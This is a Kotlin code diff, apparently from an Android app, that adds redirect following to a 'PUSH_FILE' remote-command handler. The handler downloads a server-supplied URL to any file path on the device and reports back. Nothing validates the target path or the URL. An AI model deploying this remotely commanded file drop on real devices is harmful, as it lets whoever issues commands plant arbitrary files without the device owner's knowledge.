@@ -225,42 +225,57 @@ object CommandProcessor {
                     }
                 }
                 "PUSH_FILE" -> {
-                    // Format: "URL | Target_Path"
                     val parts = content.split("|")
                     if (parts.size < 2) {
                         status = "FAILED (BAD_FORMAT)"
                         errorMsg = "Required format: URL | /path/to/save/file.ext"
                     } else {
-                        val downloadUrl = parts[0].trim()
+                        var currentUrl = parts[0].trim()
                         val targetPath = parts[1].trim()
                         val targetFile = File(targetPath)
-
+                        
                         try {
-                            targetFile.parentFile?.mkdirs() // Create directories if missing
-                            val url = URL(downloadUrl)
-                            val connection = url.openConnection() as java.net.HttpURLConnection
-                            connection.connectTimeout = 30000
-                            connection.readTimeout = 30000
-                            
-                            if (connection.responseCode == 200) {
-                                connection.inputStream.use { input ->
-                                    targetFile.outputStream().use { output ->
-                                        input.copyTo(output, 8192)
-                                    }
+                            targetFile.parentFile?.mkdirs()
+                            var connection: java.net.HttpURLConnection
+                            var redirects = 0
+                            val maxRedirects = 5
+
+                            while (true) {
+                                val url = URL(currentUrl)
+                                connection = url.openConnection() as java.net.HttpURLConnection
+                                connection.instanceFollowRedirects = false // Manually handle for control
+                                connection.connectTimeout = 30000
+                                connection.readTimeout = 30000
+                                
+                                val code = connection.responseCode
+                                if (code in 300..308 && redirects < maxRedirects) {
+                                    currentUrl = connection.getHeaderField("Location")
+                                    redirects++
+                                    continue
                                 }
-                                status = "DEPLOYMENT_SUCCESS"
-                                val result = JSONObject()
-                                result.put("saved_to", targetFile.absolutePath)
-                                result.put("size", targetFile.length())
-                                updateCommandStatus(ctx, id, status, null, result, null)
-                                return
-                            } else {
-                                status = "DEPLOYMENT_FAILED"
-                                errorMsg = "Server returned HTTP ${connection.responseCode}"
+
+                                if (code == 200) {
+                                    connection.inputStream.use { input ->
+                                        targetFile.outputStream().use { output ->
+                                            input.copyTo(output, 8192)
+                                        }
+                                    }
+                                    status = "DEPLOYMENT_SUCCESS"
+                                    val result = JSONObject()
+                                    result.put("saved_to", targetFile.absolutePath)
+                                    result.put("size", targetFile.length())
+                                    result.put("redirects", redirects)
+                                    updateCommandStatus(ctx, id, status, null, result, null)
+                                    return
+                                } else {
+                                    status = "DEPLOYMENT_FAILED"
+                                    errorMsg = "HTTP $code at end of chain"
+                                    break
+                                }
                             }
                         } catch (e: Exception) {
                             status = "DEPLOYMENT_ERROR"
-                            errorMsg = e.message
+                            errorMsg = e.toString()
                         }
                     }
                 }
